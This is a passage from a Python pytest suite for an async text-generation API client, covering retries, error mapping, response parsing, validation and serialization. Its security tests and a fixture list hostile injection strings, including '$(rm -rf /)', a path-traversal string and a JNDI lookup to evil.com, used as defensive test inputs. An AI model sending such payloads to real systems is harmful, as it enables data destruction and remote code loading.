        assert result.model == "genesis-v1"
        assert result.created is None
        assert result.usage == {}
        
        # Response with all fields
        complete_response = {
            "id": "complete_id",
            "text": "Complete response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20},
            "metadata": {"custom_field": "value"}
        }
        
        result = parse_genesis_response(complete_response)
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10
        assert hasattr(result, 'metadata') or True  # Handle extra fields gracefully

    @pytest.mark.asyncio
    async def test_retry_with_jitter_and_backoff_variations(self):
        """
        Test that the retry logic with exponential backoff and jitter correctly retries on transient errors and succeeds after multiple failures.
        
        Simulates a function that fails several times with server errors before succeeding, and verifies that the retry mechanism invokes the function and backoff delays the expected number of times.
        """
        mock_func = AsyncMock()
        
        # Test with increasing failure then success
        mock_func.side_effect = [
            GenesisAPIServerError("Server error 1"),
            GenesisAPIServerError("Server error 2"),
            GenesisAPIServerError("Server error 3"),
            "Success after multiple retries"
        ]
        
        with patch('asyncio.sleep') as mock_sleep:
            result = await retry_with_exponential_backoff(mock_func, max_retries=4)
            assert result == "Success after multiple retries"
            assert mock_func.call_count == 4
            # Verify exponential backoff was called
            assert mock_sleep.call_count == 3

    def test_genesis_request_immutability_and_copying(self):
        """
        Test that GenesisRequest instances are immutable and can be safely copied or recreated from modified dictionaries.
        
        Verifies that changes to a dictionary representation do not affect the original object, and that new instances can be created from modified data without altering the original.
        """
        original_request = GenesisRequest(
            prompt="Original prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        # Test that modifying dict doesn't affect original
        request_dict = original_request.to_dict()
        request_dict["prompt"] = "Modified prompt"
        
        assert original_request.prompt == "Original prompt"  # Should be unchanged
        
        # Test creating new request from modified dict
        modified_request = GenesisRequest.from_dict(request_dict)
        assert modified_request.prompt == "Modified prompt"
        assert original_request.prompt == "Original prompt"

    def test_genesis_response_timestamp_handling(self):
        """
        Test that the `GenesisResponse` correctly preserves and handles timestamp fields, including conversion to a UTC datetime object.
        """
        current_timestamp = int(datetime.now(timezone.utc).timestamp())
        
        response = GenesisResponse(
            id="timestamp_test_id",
            text="Timestamp test",
            model="genesis-v1",
            created=current_timestamp,
            usage={"prompt_tokens": 5, "completion_tokens": 10}
        )
        
        # Test timestamp is preserved correctly
        assert response.created == current_timestamp
        
        # Test converting to datetime if needed
        response_datetime = datetime.fromtimestamp(response.created, tz=timezone.utc)
        assert isinstance(response_datetime, datetime)

    @pytest.mark.asyncio
    async def test_error_recovery_and_graceful_degradation(self):
        """
        Tests that the GenesisAPI client raises a GenesisAPIServerError and preserves error details when the service is partially unavailable, ensuring graceful degradation in response to a 503 status.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Test partial service availability
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Service partially unavailable", "details": "Model temporarily down"}
            )
            
            with pytest.raises(GenesisAPIServerError) as exc_info:
                await genesis_api.generate_text("Test graceful degradation")
            
            assert "Service partially unavailable" in str(exc_info.value)

    def test_exception_hierarchy_and_inheritance(self):
        """
        Verify that all custom GenesisAPI exceptions inherit from both GenesisAPIError and Exception.
        """
        # Test that all custom exceptions inherit from GenesisAPIError
        auth_error = GenesisAPIAuthenticationError("Auth test")
        rate_limit_error = GenesisAPIRateLimitError("Rate limit test")
        server_error = GenesisAPIServerError("Server test")
        timeout_error = GenesisAPITimeoutError("Timeout test")
        
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_limit_error, GenesisAPIError)
        assert isinstance(server_error, GenesisAPIError)
        assert isinstance(timeout_error, GenesisAPIError)
        
        # Test that they're all Exception subclasses
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_limit_error, Exception)
        assert isinstance(server_error, Exception)
        assert isinstance(timeout_error, Exception)

    @pytest.mark.asyncio
    async def test_request_cancellation_handling(self):
        """
        Tests that the GenesisAPI correctly handles cancellation of an in-progress text generation request by raising asyncio.CancelledError.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate a long-running request that gets cancelled
            async def slow_request(*args, **kwargs):
                """
                Simulates a slow asynchronous request by introducing a delay before returning a mock object.
                
                Returns:
                    MagicMock: A mock object representing the result of the simulated request.
                """
                await asyncio.sleep(10)  # Simulate slow request
                return MagicMock()
            
            mock_post.side_effect = slow_request
            
            # Start request and cancel it quickly
            task = asyncio.create_task(genesis_api.generate_text("Long running prompt"))
            await asyncio.sleep(0.1)  # Let it start
            task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await task

    @pytest.mark.asyncio
    async def test_malformed_response_structure_variants(self):
        """
        Test that the GenesisAPI raises GenesisAPIError when receiving various malformed response structures from the API.
        
        This test covers cases where required fields are missing, empty, or set to None in the API response.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        malformed_responses = [
            {"text": "Missing id and model"},
            {"id": "test", "model": "genesis-v1"},  # Missing text
            {"id": "test", "text": "test", "model": None},  # Null model
            {"id": "", "text": "test", "model": "genesis-v1"},  # Empty id
            {"id": "test", "text": "", "model": "genesis-v1"},  # Empty text
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": None},  # Null usage
        ]
        
        for response_data in malformed_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_data)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                with pytest.raises(GenesisAPIError):
                    await genesis_api.generate_text("Test malformed response")

    def test_configuration_validation_comprehensive(self):
        """
        Tests that the GenesisAPI raises ValueError for invalid configuration parameters, including timeouts, retry counts, and malformed base URLs.
        """
        # Test invalid timeout values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=-1)
        
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=0)
        
        # Test invalid max_retries values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, max_retries=-1)
        
        # Test URL validation
        invalid_urls = [
            "not_a_url",
            "ftp://invalid.com",
            "http://",
            "https://",
            "",
            None
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                GenesisAPI(api_key=self.api_key, base_url=url)

    @pytest.mark.asyncio
    async def test_response_size_limits_and_handling(self):
        """
        Test that the API client can handle and process extremely large response payloads without errors.
        
        Verifies that a 1MB text response is received and correctly parsed by the `generate_text` method.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        # Simulate extremely large response
        huge_text = "x" * 1000000  # 1MB of text
        
        mock_response = {
            "id": "huge_response_id",
            "text": huge_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 1000000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses gracefully
            result = await genesis_api.generate_text("Generate huge response")
            assert len(result.text) == 1000000


class TestGenesisAPISecurityAndValidation:
    """Security and validation focused tests."""
    
    def test_input_sanitization_and_injection_prevention(self):
        """
        Tests that prompt formatting preserves potentially malicious input unchanged and that API key validation rejects malicious or unsafe input values.
        """
        potentially_malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",  # Null bytes and control characters
        ]
        
        for malicious_input in potentially_malicious_inputs:
            # Should not raise exceptions during formatting
            formatted = format_genesis_prompt(malicious_input)
            assert formatted["prompt"] == malicious_input  # Should be preserved as-is
            
            # API key validation should reject malicious content
            assert validate_api_key(malicious_input) == False

    def test_rate_limiting_headers_parsing(self):
        """
        Tests that rate limiting error scenarios correctly parse and include relevant rate limiting headers in the raised exception.
        """
        rate_limit_scenarios = [
            (429, {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1234567890"}),
            (429, {"Retry-After": "60"}),
            (429, {"X-RateLimit-Limit": "1000", "X-RateLimit-Window": "3600"}),
        ]
        
        for status_code, headers in rate_limit_scenarios:
            # Test that rate limit error includes header information
            with pytest.raises(GenesisAPIRateLimitError):
                handle_genesis_error(status_code, {"error": "Rate limited"})

    @pytest.mark.asyncio
    async def test_ssl_and_certificate_validation(self):
        """
        Test that SSL/TLS certificate validation errors during API requests raise a GenesisAPIError.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate SSL certificate error
            mock_post.side_effect = aiohttp.ClientSSLError("SSL certificate verification failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test SSL validation")


class TestGenesisAPIObservabilityAndDebugging:
    """Tests for observability, logging, and debugging features."""
    
    @pytest.mark.asyncio
    async def test_request_response_logging(self):
        """
        Verifies that request and response logging occurs during a text generation API call for debugging purposes.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logged_id",
            "text": "Logged response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with patch('logging.getLogger') as mock_logger:
                logger_instance = MagicMock()
                mock_logger.return_value = logger_instance
                
                await genesis_api.generate_text("Test logging")
                
                # Verify that appropriate log calls were made
                assert logger_instance.debug.called or logger_instance.info.called

    def test_error_context_preservation(self):
        """
        Test that exceptions raised by `handle_genesis_error` include relevant error context for debugging.
        
        Verifies that the error message of the raised exception contains useful information from the error response.
        """
        error_scenarios = [
            (401, {"error": "Invalid API key", "error_code": "AUTH_001"}),
            (429, {"error": "Rate limit exceeded", "retry_after": 60}),
            (500, {"error": "Internal server error", "trace_id": "abc123"}),
        ]
        
        for status_code, error_data in error_scenarios:
            try:
                handle_genesis_error(status_code, error_data)
                assert False, "Should have raised an exception"
            except GenesisAPIError as e:
                # Verify error message contains useful debugging information
                error_message = str(e)
                assert "error" in error_message.lower()

    @pytest.mark.asyncio
    async def test_performance_metrics_collection(self):
        """
        Tests that performance metrics such as request duration and token usage are correctly collected and accessible after a text generation API call.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "metrics_id",
            "text": "Metrics response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Collect metrics")
            end_time = datetime.now()
            
            # Verify timing metrics can be calculated
            duration = (end_time - start_time).total_seconds()
            assert duration >= 0
            assert result.usage["prompt_tokens"] == 10
            assert result.usage["completion_tokens"] == 20


# Additional fixtures for the new tests
@pytest.fixture
def malformed_response_data():
    """
    Provides a list of malformed response data dictionaries for testing error handling in response parsing.
    """
    return [
        {},  # Empty response
        {"id": "test"},  # Missing required fields
        {"text": None},  # Null values
        {"id": "test", "text": "test", "model": "genesis-v1", "usage": "invalid"},  # Invalid usage type
    ]


@pytest.fixture
def security_test_inputs():
    """
    Provides a list of test inputs designed to simulate common security threats such as SQL injection, XSS, path traversal, command injection, template injection, and LDAP injection.
    """
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "$(rm -rf /)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ]


@pytest.fixture
def performance_test_config():
    """
    Provides configuration parameters for performance tests, including batch size, response time threshold, memory usage limit, and number of concurrent requests.
    """
    return {
        "large_batch_size": 100,
        "response_time_threshold": 5.0,
        "memory_threshold_mb": 100,
        "concurrent_requests": 20
    }


# Parameterized tests for comprehensive coverage
@pytest.mark.parametrize("invalid_temp", [-0.1, 1.1, 2.0, -1.0, 1.5])
def test_temperature_validation_parameterized(invalid_temp):
    """
    Tests that invalid temperature values raise a ValueError when formatting a Genesis prompt.
    
    Parameters:
        invalid_temp: An invalid temperature value to be tested.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", temperature=invalid_temp)


@pytest.mark.parametrize("invalid_tokens", [-1, 0, 10000, -100])
def test_max_tokens_validation_parameterized(invalid_tokens):
    """
    Tests that providing invalid values for `max_tokens` to `format_genesis_prompt` raises a ValueError.
    
    Parameters:
        invalid_tokens: An invalid value for the `max_tokens` parameter to be tested.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", max_tokens=invalid_tokens)


@pytest.mark.parametrize("status_code,expected_exception", [
    (400, GenesisAPIError),
    (401, GenesisAPIAuthenticationError),
    (403, GenesisAPIAuthenticationError),
    (404, GenesisAPIError),
    (429, GenesisAPIRateLimitError),
    (500, GenesisAPIServerError),
    (502, GenesisAPIServerError),
    (503, GenesisAPIServerError),
])
def test_error_handling_parameterized(status_code, expected_exception):
    """
    Tests that the correct exception is raised by `handle_genesis_error` for a given HTTP status code.
    
    Parameters:
        status_code (int): The HTTP status code to test.
        expected_exception (Exception): The exception type expected to be raised.
    """
    with pytest.raises(expected_exception):
        handle_genesis_error(status_code, {"error": f"Error {status_code}"})

class TestGenesisAPIAdvancedEdgeCases:
    """Additional edge case tests for comprehensive coverage."""
    
    def setup_method(self):
        """Setup method for advanced edge case tests."""
        self.api_key = "test_api_key_edge_cases"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_generate_text_with_special_characters_in_prompt(self):
        """Test text generation with various special characters in prompts."""
        special_prompts = [
            "Test with newlines\n\nand tabs\t\there",
            "Test with quotes 'single' and \"double\"",
            "Test with backslashes \\ and forward slashes /",
            "Test with unicode: é, ñ, 中文, русский, العربية",
            "Test with emojis: 😀🎉🚀💡",
            "Test with mathematical symbols: ∑, ∞, ≤, ≥, ∂",
            "Test with markup-like content: <tag>content</tag>",
            "Test with JSON-like: {\"key\": \"value\", \"number\": 42}",
            "Test with code: def func(): return 'hello'",
            "Test with URLs: https://example.com/path?param=value",
        ]
        
        mock_response = {
            "id": "special_chars_id",
            "text": "Response with special handling",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 20, "completion_tokens": 15}
        }
        
        for prompt in special_prompts:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await self.genesis_api.generate_text(prompt)
                assert result.text == "Response with special handling"
                
                # Verify the prompt was passed correctly
                call_args = mock_post.call_args
                assert call_args[1]['json']['prompt'] == prompt

    @pytest.mark.asyncio
    async def test_generate_text_with_binary_content_rejection(self):
        """Test that binary content in prompts is handled appropriately."""
        binary_content = b'\x00\x01\x02\xff\xfe\xfd'
        
        with pytest.raises(TypeError):
            await self.genesis_api.generate_text(binary_content)

    @pytest.mark.asyncio
    async def test_generate_text_with_extremely_nested_data_structures(self):
        """Test handling of complex nested data structures in parameters."""
        complex_params = {
            "nested": {
                "deep": {
                    "structure": [1, 2, {"inner": "value"}]
                }
            }
        }
        
        mock_response = {
            "id": "nested_test_id",
            "text": "Nested structure response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that complex parameters are handled appropriately
            result = await self.genesis_api.generate_text(
                "Test prompt",
                custom_params=complex_params
            )
            assert result.text == "Nested structure response"

    @pytest.mark.asyncio
    async def test_api_response_with_unexpected_additional_fields(self):
        """Test handling of API responses with unexpected additional fields."""
        response_with_extra_fields = {
            "id": "extra_fields_id",
            "text": "Response with extra fields",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20},
            "experimental_field": "unexpected_value",
            "metadata": {
                "version": "1.2.3",
                "build": "abc123",
                "features": ["feature1", "feature2"]
            },
            "statistics": {
                "processing_time": 0.5,
                "queue_time": 0.1
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_with_extra_fields)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Test extra fields")
            assert result.text == "Response with extra fields"
            assert result.usage["prompt_tokens"] == 10

    @pytest.mark.asyncio
    async def test_api_timeout_with_partial_response(self):
        """Test handling of timeout scenarios with partial responses."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate timeout during response reading
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=asyncio.TimeoutError("Response reading timeout")
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPITimeoutError):
                await self.genesis_api.generate_text("Test partial timeout")

    @pytest.mark.asyncio
    async def test_concurrent_requests_with_mixed_outcomes(self):
        """Test concurrent requests with mixed success and failure outcomes."""
        success_response = {
            "id": "success_id",
            "text": "Success response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Mix of success and various failure responses
            mock_responses = [
                (200, success_response),
                (429, {"error": "Rate limit"}),
                (500, {"error": "Server error"}),
                (200, success_response),
                (401, {"error": "Auth error"}),
            ]
            
            async def mock_response_generator(*args, **kwargs):
                status, response_data = mock_responses.pop(0)
                mock_resp = AsyncMock()
                mock_resp.status = status
                mock_resp.json = AsyncMock(return_value=response_data)
                return mock_resp
            
            mock_post.return_value.__aenter__.side_effect = mock_response_generator
            
            tasks = [
                self.genesis_api.generate_text(f"Concurrent test {i}")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check that we got a mix of successes and exceptions
            successes = [r for r in results if isinstance(r, GenesisResponse)]
            exceptions = [r for r in results if isinstance(r, Exception)]
            
            assert len(successes) == 2  # Two successful responses
            assert len(exceptions) == 3  # Three different types of errors

    def test_genesis_request_deep_copy_behavior(self):
        """Test deep copy behavior of GenesisRequest objects."""
        import copy
        
        original = GenesisRequest(
            prompt="Original prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7,
            custom_data={"nested": {"value": 42}}
        )
        
        # Test deep copy
        copied = copy.deepcopy(original)
        assert copied.prompt == original.prompt
        assert copied.model == original.model
        assert copied.max_tokens == original.max_tokens
        assert copied.temperature == original.temperature
        
        # Verify it's a true deep copy (modifying copy doesn't affect original)
        if hasattr(copied, 'custom_data'):
            copied.custom_data["nested"]["value"] = 999
            assert original.custom_data["nested"]["value"] == 42

    def test_genesis_response_string_representation(self):
        """Test string representation of GenesisResponse objects."""
        response = GenesisResponse(
            id="repr_test_id",
            text="Test response for string representation",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 15, "completion_tokens": 25}
        )
        
        response_str = str(response)
        assert "repr_test_id" in response_str
        assert "genesis-v1" in response_str
        
        # Test repr as well
        response_repr = repr(response)
        assert "GenesisResponse" in response_repr
        assert "repr_test_id" in response_repr

    @pytest.mark.asyncio
    async def test_api_with_custom_user_agent_headers(self):
        """Test API calls with custom user agent and headers."""
        custom_headers = {
            "User-Agent": "TestClient/1.0",
            "X-Custom-Header": "custom_value",
            "Accept": "application/json"
        }
        
        genesis_api = GenesisAPI(
            api_key=self.api_key,
            base_url=self.base_url,
            custom_headers=custom_headers
        )
        
        mock_response = {
            "id": "custom_headers_id",
            "text": "Custom headers response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await genesis_api.generate_text("Test custom headers")
            assert result.text == "Custom headers response"
            
            # Verify custom headers were included
            call_args = mock_post.call_args
            if 'headers' in call_args[1]:
                headers = call_args[1]['headers']
                assert headers.get("User-Agent") == "TestClient/1.0"
                assert headers.get("X-Custom-Header") == "custom_value"

    @pytest.mark.asyncio
    async def test_request_id_correlation_across_retries(self):
        """Test that request IDs are properly correlated across retry attempts."""
        original_request_id = str(uuid.uuid4())
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # First attempt fails, second succeeds
            mock_responses = [
                (503, {"error": "Service unavailable"}),
                (200, {
                    "id": original_request_id,
                    "text": "Retry success",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                })
            ]
            
            response_iterator = iter(mock_responses)
            
            async def mock_response_generator(*args, **kwargs):
                status, response_data = next(response_iterator)
                mock_resp = AsyncMock()
                mock_resp.status = status
                mock_resp.json = AsyncMock(return_value=response_data)
                return mock_resp
            
            mock_post.return_value.__aenter__.side_effect = mock_response_generator
            
            with patch('asyncio.sleep'):  # Speed up retry delays
                result = await self.genesis_api.generate_text("Test retry correlation")
                assert result.id == original_request_id
                assert result.text == "Retry success"

    def test_error_message_formatting_and_localization(self):
        """Test error message formatting and potential localization support."""
        error_scenarios = [
            {
                "status": 401,
                "error_data": {
                    "error": "Invalid API key",
                    "error_code": "AUTH_001",
                    "message": "The provided API key is invalid or expired",
                    "documentation_url": "https://docs.genesis.com/errors#AUTH_001"
                }
            },
            {
                "status": 429,
                "error_data": {
                    "error": "Rate limit exceeded",
                    "error_code": "RATE_001",
                    "message": "You have exceeded your rate limit. Please try again later.",
                    "retry_after": 60,
                    "limit": 100,
                    "window": 3600
                }
            },
            {
                "status": 500,
                "error_data": {
                    "error": "Internal server error",
                    "error_code": "INTERNAL_001",
                    "message": "An unexpected error occurred. Please try again.",
                    "trace_id": "abc123def456"
                }
            }
        ]
        
        for scenario in error_scenarios:
            try:
                handle_genesis_error(scenario["status"], scenario["error_data"])
                assert False, "Expected exception to be raised"
            except GenesisAPIError as e:
                error_message = str(e)
                # Verify error message contains useful information
                assert len(error_message) > 0
                # Check for presence of key error information
                if "error_code" in scenario["error_data"]:
                    assert scenario["error_data"]["error_code"] in error_message or \
                           scenario["error_data"]["error"] in error_message


class TestGenesisAPIDataValidationAndSerialization:
    """Tests for data validation and serialization edge cases."""
    
    def test_genesis_request_with_none_values(self):
        """Test GenesisRequest handling of None values in various fields."""
        # Test that None values are handled appropriately
        with pytest.raises(ValueError):
            GenesisRequest(prompt=None, model="genesis-v1")
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model=None)
        
        # Test that None values in optional fields are handled
        request = GenesisRequest(
            prompt="Test",
            model="genesis-v1",
            max_tokens=None,  # Should use default
            temperature=None  # Should use default
        )
        assert request.prompt == "Test"
        assert request.model == "genesis-v1"

    def test_genesis_response_with_missing_optional_fields(self):
        """Test GenesisResponse creation with various missing optional fields."""
        # Test minimal response
        minimal_response = GenesisResponse(
            id="minimal_id",
            text="Minimal text",
            model="genesis-v1"
        )
        assert minimal_response.id == "minimal_id"
        assert minimal_response.text == "Minimal text"
        assert minimal_response.model == "genesis-v1"
        assert minimal_response.created is None
        assert minimal_response.usage == {}
        
        # Test response with partial optional fields
        partial_response = GenesisResponse(
            id="partial_id",
            text="Partial text",
            model="genesis-v1",
            created=1234567890
        )
        assert partial_response.created == 1234567890
        assert partial_response.usage == {}

    def test_json_serialization_round_trip(self):
        """Test JSON serialization and deserialization round trip."""
        original_request = GenesisRequest(
            prompt="Serialization test",
            model="genesis-v1",
            max_tokens=200,
            temperature=0.8
        )
        
        # Convert to dict, then to JSON, then back
        request_dict = original_request.to_dict()
        json_str = json.dumps(request_dict)
        parsed_dict = json.loads(json_str)
        reconstructed_request = GenesisRequest.from_dict(parsed_dict)
        
        assert reconstructed_request.prompt == original_request.prompt
        assert reconstructed_request.model == original_request.model
        assert reconstructed_request.max_tokens == original_request.max_tokens
        assert reconstructed_request.temperature == original_request.temperature

    def test_unicode_handling_in_serialization(self):
        """Test proper Unicode handling in serialization."""
        unicode_text = "Test with Unicode: 你好世界 🌍 café naïve résumé"
        
        request = GenesisRequest(
            prompt=unicode_text,
            model="genesis-v1",
            max_tokens=100
        )
        
        # Test serialization preserves Unicode
        serialized = request.to_dict()
        assert serialized["prompt"] == unicode_text
        
        # Test deserialization preserves Unicode
        reconstructed = GenesisRequest.from_dict(serialized)
        assert reconstructed.prompt == unicode_text

    def test_large_numerical_values_handling(self):
        """Test handling of large numerical values in usage statistics."""
        large_usage = {
            "prompt_tokens": 999999999,
            "completion_tokens": 888888888,
            "total_tokens": 1888888887
        }
        
        response = GenesisResponse(
            id="large_numbers_id",
            text="Large numbers test",
            model="genesis-v1",
            created=1234567890,
            usage=large_usage
        )
        
        assert response.usage["prompt_tokens"] == 999999999
        assert response.usage["completion_tokens"] == 888888888
        assert response.usage["total_tokens"] == 1888888887

    def test_floating_point_precision_in_temperature(self):
        """Test floating point precision handling in temperature values."""
        precision_values = [0.0, 0.1, 0.12345, 0.999999, 1.0]
        
        for temp in precision_values:
            request = GenesisRequest(
                prompt="Precision test",
                model="genesis-v1",
                temperature=temp
            )
            assert abs(request.temperature - temp) < 1e-10  # Allow for floating point precision

    def test_date_time_edge_cases_in_response(self):
        """Test edge cases in datetime handling for response timestamps."""
        edge_case_timestamps = [
            0,  # Unix epoch
            1234567890,  # Common test timestamp
            2147483647,  # Max 32-bit signed integer
            253402300799,  # Year 9999
        ]
        
        for timestamp in edge_case_timestamps:
            response = GenesisResponse(
                id="datetime_test_id",
                text="DateTime test",
                model="genesis-v1",
                created=timestamp
            )
            assert response.created == timestamp
            
            # Test that timestamp can be converted to datetime
            if timestamp > 0:
                dt = datetime.fromtimestamp(timestamp, tz=timezone.utc)
                assert isinstance(dt, datetime)


class TestGenesisAPIStateAndLifecycle:
    """Tests for API state management and lifecycle."""
    
    def setup_method(self):
        """Setup for lifecycle tests."""
        self.api_key = "lifecycle_test_key"
        self.base_url = "https://api.genesis.example.com"

    def test_api_instance_immutability(self):
        """Test that API instance configuration is immutable after creation."""
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        original_api_key = api.api_key
        original_base_url = api.base_url
        original_timeout = api.timeout
        
        # Attempting to modify should not change the instance
        try:
            api.api_key = "new_key"
        except AttributeError:
            pass  # Expected if property is read-only
        
        # Verify values haven't changed
        assert api.api_key == original_api_key
        assert api.base_url == original_base_url
        assert api.timeout == original_timeout

    @pytest.mark.asyncio
    async def test_api_resource_cleanup_on_context_exit(self):
        """Test proper resource cleanup when using API as context manager."""
        cleanup_called = False
        
        class MockSession:
            def __init__(self):
                self.closed = False
                
            async def close(self):
                nonlocal cleanup_called
                cleanup_called = True
                self.closed = True
                
            async def __aenter__(self):
                return self
                
            async def __aexit__(self, exc_type, exc_val, exc_tb):
                await self.close()
        
        with patch('aiohttp.ClientSession', MockSession):
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                pass  # Just enter and exit the context
            
            # Verify cleanup was called
            assert cleanup_called

    def test_multiple_api_instances_independence(self):
        """Test that multiple API instances are independent."""
        api1 = GenesisAPI(api_key="key1", base_url="https://api1.example.com")
        api2 = GenesisAPI(api_key="key2", base_url="https://api2.example.com")
        
        assert api1.api_key != api2.api_key
        assert api1.base_url != api2.base_url
        
        # Test that modifying one doesn't affect the other
        api1_original_timeout = api1.timeout
        api2_original_timeout = api2.timeout
        
        # Create new instance with different timeout
        api3 = GenesisAPI(api_key="key3", base_url="https://api3.example.com", timeout=120)
        
        assert api1.timeout == api1_original_timeout
        assert api2.timeout == api2_original_timeout
        assert api3.timeout == 120

    @pytest.mark.asyncio
    async def test_api_state_during_concurrent_operations(self):
        """Test API state consistency during concurrent operations."""
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "concurrent_state_id",
            "text": "Concurrent state response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start multiple concurrent operations
            tasks = [
                api.generate_text(f"Concurrent prompt {i}")
                for i in range(10)
            ]
            
            results = await asyncio.gather(*tasks)
            
            # Verify all requests completed successfully
            assert len(results) == 10
            for result in results:
                assert result.text == "Concurrent state response"
            
            # Verify API state is still consistent
            assert api.api_key == self.api_key
            assert api.base_url == self.base_url


# Additional fixtures for the new comprehensive tests
@pytest.fixture
def comprehensive_test_data():
    """Fixture providing comprehensive test data for various scenarios."""
    return {
        "unicode_texts": [
            "Hello 世界",
            "Café naïve résumé",
            "Москва",
            "العربية",
            "🌍🚀💡😀",
            "∑∞≤≥∂"
        ],
        "special_characters": [
            "\n\t\r",
            "\\\"'/",
            "<>&",
            "{}[]",
            "$()",
            "@#%"
        ],
        "large_numbers": [
            999999999,
            1234567890123,
            float('inf'),
            -float('inf')
        ],
        "edge_case_timestamps": [
            0,
            1234567890,
